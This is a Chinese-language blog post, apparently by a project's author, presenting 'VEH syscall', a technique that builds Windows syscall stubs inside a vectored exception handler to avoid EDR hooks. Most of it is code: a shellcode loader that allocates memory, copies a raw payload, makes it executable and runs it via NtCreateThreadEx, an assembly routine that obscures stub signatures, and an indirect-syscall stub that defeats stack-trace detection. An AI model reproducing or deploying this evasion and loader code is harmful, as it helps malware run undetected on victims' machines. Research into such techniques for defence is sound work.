[toc]

## 前记

历史热门syscall项目

- Hell’s Gate：地狱之门【查找hash】
- Halo's Gate：光环之门【上下遍历】
- Spoofing-Gate：欺骗之门【替换伪造】
- ParallelSyscalls【内存修复】
- GetSSN【遍历排序】
- SysWhispers3【查找替换】

上面的项目都很不错，值得学习。今天介绍的是一个冷门的syscall方法：**VEH syscall**

**项目已开源，求个stars嘻嘻嘻**

```
https://github.com/coleak2021/vehsyscall
```



## VEH syscall

**VEH基础**

```c
#include <windows.h>
#include <stdio.h>

// VEH原型
LONG CALLBACK VectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
LONG CALLBACK VectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    // 检查是否存在访问冲突
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        printf("Access violation detected!\n");
        // 处理访问冲突的代码段
    }

    // 处理其他额外异常的代码段

    // EXCEPTION_CONTINUE_SEARCH返回值为0，并且调用下一个处理程序函数
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {
    // 注册VEH
    PVOID handle = AddVectoredExceptionHandler(1, VectoredExceptionHandler);
    // 取消注册VEH
    RemoveVectoredExceptionHandler(handle);
    return 0;
}
```



**VEH syscall流程**

![image-20240229092953218](C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20240229092953218.png)

```c
// Vectored Exception Handler function
LONG CALLBACK PvectoredExceptionHandler(PEXCEPTION_POINTERS exception_ptr) {
    // Check if the exception is an access violation
    if (exception_ptr->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // Modify the thread's context to redirect execution to the syscall address
        // Copy RCX register to R10
        exception_ptr->ContextRecord->R10 = exception_ptr->ContextRecord->Rcx;

        // Copy RIP (Instruction Pointer) to RAX (RIP keeps SSN --> RAX keeps SSN)      
        exception_ptr->ContextRecord->Rax = exception_ptr->ContextRecord->Rip;

        // Set RIP to global address (set syscalls address retrieved from NtDrawText to RIP register)       
        exception_ptr->ContextRecord->Rip = g_syscall_addr;

        // Continue execution at the new instruction pointer
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    // Continue searching for another exception handler
    return EXCEPTION_CONTINUE_SEARCH;
}
```

> 这里通过ContextRecord修改程序上下文中的寄存器值构造了syscall stub



**vehsyscall关键代码分析**

```c
// define var
std::map<int, string> Nt_Table;
DWORD t = 0;
LPVOID m_Index = m_Index = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "NtDrawText");//a safe function address that may not be hooked by edr

//main function
int main(int argc, char* argv[]) {
    //exec NtAllocateVirtualMemory
    NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    t = GetSSN("ZwAllocateVirtualMemory");
    pNtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    //write your code
    VxMoveMemory(lpAddress, rawData, sizeof(rawData));

    //exec NtProtectVirtualMemory
    NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    t = GetSSN("ZwProtectVirtualMemory");
    pNtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);


    //exec NtCreateThreadEx
    pNtCreateThreadEx NtCreateThreadEx = NULL;
    t = GetSSN("ZwCreateThreadEx");
    NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpAddress, NULL, 0, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

int GetSSN(std::string apiname)
{
    int index = 0;
    for (std::map<int, string>::iterator iter = Nt_Table.begin(); iter != Nt_Table.end(); ++iter)
    {
        if (apiname == iter->second)
            return index;
        index++;
    }
}

//VEH function
LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    // handle EXCEPTION_ACCESS_VIOLATION
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // Construct syscall stub

        pExceptionInfo->ContextRecord->R10 = pExceptionInfo->ContextRecord->Rcx; // mov r10,rcx
        hello(); 
        pExceptionInfo->ContextRecord->Rax = t;   //mov rax,xxx
        hello();
        pExceptionInfo->ContextRecord->Rip = (DWORD64)((DWORD64)m_Index + 0x12); // syscall
        hello();
        return EXCEPTION_CONTINUE_EXECUTION; // cintinue your code
    }
    return EXCEPTION_CONTINUE_SEARCH; //find othner function to handle VEH  
}
```

> 通过遍历‘Zw’的map获取SSN，利用EXCEPTION_ACCESS_VIOLATION异常处理进行syscall stub构造



**coleak.asm**

```asm
.data
	name db 'coleak',0

.code 
	hello PROC
		nop
		mov eax,ebx
		mov ebx,edx
		mov ebx,eax
		nop
		mov edx,ebx
		ret
	hello ENDP
end
```

> 简单打乱下syscall stub的特征



## 后记

**_LDR_DATA_TABLE_ENTRY**

根据InMemoryOrderModuleList的Flink值查找对应结构时，一定要减去16字节（0x10），以保证我们正确对齐（x86或x64皆如此）



**段寄存器**

x64 GS

```c
gs:[0x30]                 TEB
gs:[0x40]                 Pid
gs:[0x48]                 Tid
gs:[0x60]                 PEB
gs:[0x68]                 LastError
```

x86 FS

```c
一、MOV EAX, FS: [0x18] 
MOV EAX, [EAX + 0x30]
二、MOV EAX, FS: [0x30]
//peb
```



**PEB地址**

- ​    在x86进程的线程进程块(**TEB**)中FS寄存器中的0x30偏移处找到。 
- ​    在x64进程的线程进程块(**TEB**)中GS寄存器中的0x60偏移处找到。



***OSMajorVersion***
一个表示操作系统的主版本号的数字。 下表定义了 Windows 操作系统的主版本。

```c
Windows 版本	主版本
Windows 11 (所有版本)	10
Windows Server 2022	10
Windows Server 2019	10
Windows Server 2016	10
Windows 10 (所有版本)	10
Windows Server 2012 R2	6
Windows 8.1	6
Windows Server 2012	6
Windows 8	6
Windows Server 2008 R2	6
Windows 7	6
Windows Server 2008	6
Windows Vista	6
Windows Server 2003 R2	5
Windows Server 2003	5
Windows XP	5
Windows 2000	5
```



**内存小端存储**

![image-20240228164732206](C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20240228164732206.png)



**栈回溯检测syscall**

```
正常系统调用时，主程序模块->kernel32.dll->ntdll.dll->syscall，这样当0环执行结束返回3环的时候，这个返回地址应该是在ntdll所在的地址范围之内。直接调用syscall时，rip将会是你的主程序模块内，而并不是在ntdll所在的范围内。
```

![image-20220310014525396](C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20220310014525396.png)

当然同样很好绕过，使用间接调用，也就是在ntdll中调用syscall stub的末尾部分，调用完成后会返回到ntdll，即syscall和return指令在 ntdll.dll 内存中的syscall stub执行

```c
.CODE  ; indirect syscalls assembly code
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                  ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                  ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall memory address in ntdll.dll
NtAllocateVirtualMemory ENDP      ; End of the procedure
```



**Exception-Handler返回值**

| 值                           | 含义                                                         |
| :--------------------------- | :----------------------------------------------------------- |
| EXCEPTION_EXECUTE_HANDLER    | 系统将控制权转移到异常处理程序，并在找到处理程序的堆栈帧中继续执行。 |
| EXCEPTION_CONTINUE_SEARCH    | 系统继续搜索处理程序。                                       |
| EXCEPTION_CONTINUE_EXECUTION | 系统停止对处理程序的搜索，并将控制权返回到发生异常的点。 如果异常不可持续，则会导致 **EXCEPTION_NONCONTINUABLE_EXCEPTION** 异常。 |



## Reference

```
https://xz.aliyun.com/t/13582?time__1311=mqmxnQiQG%3DDQDtG8DlcIo0%3D%3DaRiCd84D&alichlgref=https%3A%2F%2Fcn.bing.com%2F
https://0range-x.github.io/2022/03/14/syscall/
https://github.com/am0nsec/HellsGate
```

